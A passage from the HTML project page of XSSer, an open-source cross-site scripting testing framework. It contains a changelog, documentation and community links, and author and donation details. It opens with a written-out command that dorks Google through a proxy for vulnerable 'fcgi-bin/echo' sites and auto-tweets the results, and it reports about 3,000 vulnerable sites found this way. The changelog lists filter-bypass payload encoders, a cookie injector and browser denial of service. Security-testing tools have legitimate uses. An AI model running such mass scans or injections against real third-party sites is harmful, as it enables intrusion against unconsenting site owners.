./XSSer -d "'inurl:fcgi-bin/echo'" --De "google" --proxy "http://127.0.0.1:8118" -s --tweet<br><br>

Results of the -botnet- attack in real time:<br><br>

- <a href="http://identi.ca/xsserbot01">http://identi.ca/xsserbot01</a><br>
- <a href="http://twitter.com/xsserbot01">http://twitter.com/xsserbot01</a><br><br>

Reported: apróx. <a href="http://www.google.com/search?hl=nl&q=%27inurl%3Afcgi-bin%2Fecho&btnG=Zoeken">3.000 websites</a> vulnerables (<u>XSSer storm!!</u>).<br><br>

<b>September 22, 2010</b>:<br><br> 

Added a-xml exporter + ImageXSS + New dorker engines (total 10) + Core clean + Bugfixing + Social Networking XSS auto-publisher + Started -federated- XSS (full disclosure) pentesting botnet.<br><br><a href="http://identi.ca/xsserbot01">http://identi.ca/xsserbot01</a><br><a href="http://twitter.com/xsserbot01">http://twitter.com/xsserbot01</a><br><br>
<b>August 20, 2010</b>:<br><br> Added attack payloads to auto-payloader (26 new injections) + POST + Statistics + URL Shorteners + IP Octal + Post-processing payloading + DOM Shadows! + Cookie injector + Browser DoS (Denegation of Service).<br><br>
<b>July 1, 2010</b>:<br><br> Dorking + Crawling + IP DWORD + Core clean. <br><br>
<b>April 19, 2010</b>:<br><br> HTTPS implemented + patched bugs.<br><br>
<b>March 22, 2010</b>:<br><br> Added "inject your own payload" option. Can be used with all character encoding -bypassers- of XSSer.<br><br>
<b>March 18, 2010</b>:<br><br> Added attack payloads to auto-payloader (62 different XSS injections).<br><br>
<b>March 16, 2010</b>:<br><br> Added new payload encoders to bypass filters.
</li>
</ul>

<h1><a name="docs"></a>Documentation</h1>
<p>
If you have interesting documentation about XSSer, please send an email to the <a href="https://lists.sourceforge.net/lists/listinfo/xsser-users">mailing list</a>.<br><br>
-------------------<br>
</p>
<ul>
<li class="int"><a href="xsser/rooted2012_XSSer.pdf">Slides XSSer -"The Cross Site Scripting framework"</a>- 2012 presented on <a target="_blank" href="http://www.rootedcon.es/">RootedCon</a> (spanish)<br><br></li>
<li class="int"><a href="xsser/XSSer_the_mosquito_2011.pdf">Slides XSSer -"The mosquito"</a>- 2011 presented on <a href="http://thsf.tetalab.org/Schedule/Programme">THSF'11</a> (english)<br><br></li>
<li class="int">"XSS for fun and profit":
<br><br>PDF with practice examples of some XSS techniques. It was presented on the conference SCG-2009:<br><br>
<ul><li><a href="xsser/XSS_for_fun_and_profit_SCG09_(english).pdf">English version</a></li></ul></li><br>
<ul><li><a href="xsser/XSS_for_fun_and_profit_SCG09_(spanish).pdf">Spanish version</a></li></ul></li><br>
<li>XSSer URL Generation Schema: <br><br>
<img align="center" src="xsser/url_generation.png"></li><br>
</ul>

<h1><a name="ml"></a>Mailing list</h1>
<p>XSSer has one mailing list hosted on <a href="http://sourceforge.net/mail/?group_id=310700">SourceForge</a>.
</p><p>The <b>xsser-users@lists.sourceforge.net</b> mailing list is the
preferred way to ask questions, <b>report bugs</b>, suggest new features
and discuss with other users.<br><br>
The mailing list is <a href="http://sourceforge.net/mailarchive/forum.php?forum_name=xsser-users">archived
online</a>. To subscribe use the <a href="https://lists.sourceforge.net/lists/listinfo/xsser-users">online
web form</a>.</p>

<h1><a name="license"></a>License</h1>
<p>XSSer is released under the terms of the
<a href="http://www.gnu.org/licenses/quick-guide-gplv3.pdf">General Public License v3</a> and is copyrighted by
<a href="mailto:root@lordepsylon.net">psy</a>.</p>

<h1><a name="author"></a>Author</h1>
<p>GPG Public ID Key: 0xB8AC3776</p>
<ul>
<li>
Website:
</li>
<ul><li><a href="http://lordepsylon.net">http://lordepsylon.net</a></li><br>
</ul>
<li>
Email:
</li>
<ul><li><a href="mailto:root@lordepsylon.net">psy</a></li> 
<li><a href="mailto:epsylon@riseup.net">epsylon</a></li><br>
</ul>
<li>
Microblogging:
</li>
<ul><li><a href="https://identi.ca/psy">identi.ca</a></li>
<li><a href="https://twitter.com/lord_epsylon">twitter</a></li>
</ul>
</ul>

<h1><a name="community"></a>Community</h1>

<p>If you are interesting in follow last news about XSSer, you can <b>join</b> #xsser-community on many different places: </p>
<ul>
<li>
Microblogging:
</li>
<ul><li><a href="http://identi.ca/group/xsser">identi.ca</a></li>
<li><a href="https://twitter.com/lord_epsylon/xsser">twitter.com</a></li><br>
</ul>
<li>
Social networking:
</li>
<ul><li><a href="https://n-1.cc/pg/groups/15466/xsser/">lorea.org</a></li><br>
</ul><li>Or using IRC:</li><ul><li> irc.freenode.net / channel: #xsser</li></ul>
</ul>

<h1><a name="contribute"></a>Contribute</h1>
<p>If you want to contribute to XSSer development, reporting a bug,
providing a patch, commenting on the code base or simply need to find help
to run XSSer, first refer to the <a href="#docs">xsser documentation</a> and 
then surf the xsser mailing list <a href="http://sourceforge.net/mailarchive/forum.php?forum_name=xsser-users">online archives</a>. 

If nobody gets back to you, then drop me an <a href="mailto:root@lordepsylon.net">e-mail</a>.</p>

<p>Please, add one link to this site when you report some XSS vulnerabilities founded by XSSer.</p>

<h1><a name="supports"></a>Support</h1>
<p>XSSer has been one of the winner projects of the <a href="http://www.nlnet.nl/news/2010/20100623-awards.html">NLnet Awards of April (2010)</a>.<br><br>
<a href="http://www.nlnet.nl/project/xsser/"><img align="center" src="xsser/logo_nlnet.gif" alt="NLnet fundation" border="0"></a><br><br>

<p>XSSer has been added to <a href="http://www.backtrack-linux.org/forums/showthread.php?t=34770">BackTrack Linux (2010)</a>.<br><br>
<a href="http://www.backtrack-linux.org/forums/showthread.php?t=34770" target="_blank"><img align="center" src="xsser/backtrack-logo.jpg" alt="BackTrack Linux" border="0"></a><br><br>

<p>XSSer has been added to <a href="https://www.owasp.org/index.php/OWASP_XSSER">OWASP project (2012)</a>.<br><br>
<a href="https://www.owasp.org/index.php/OWASP_XSSER" target="_blank"><img align="center" src="xsser/owasp_logo.jpg" alt="OWASP" border="0"></a><br><br>
</p>

<p>This -framework- is actively looking for new sponsors and funding. <br><br>If you or your organization has an interest in keeping XSSer, please <a href="mailto:root@lordepsylon.net">contact directly</a> or send your ideas to the <a href="https://lists.sourceforge.net/lists/listinfo/xsser-users">mailing list</a>.</p>
</p>

<p>To donate some <a href="http://bitcoin.org">bitcoins</a> use this hash: <b>1Q63KtiLGzXiYA8XkWFPnWo7nKPWFr3nrc</b></p>
</div>

<div style="text-align: center;">
<br><a href="http://sourceforge.net/projects/xsser"><img src="xsser/sflogo.gif" alt="Get XSSer at SourceForge.net. Fast, secure and Free Open Source software downloads" border="0" height="30" width="120"></a>
</div>

<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script><script src="xsser/ga.js" type="text/javascript"></script>
<script type="text/javascript">
var pagetracker = _gat._gettracker("UA-5076660-1");
pagetracker._initdata();
pagetracker._trackPageview();
</script>
</body></html>

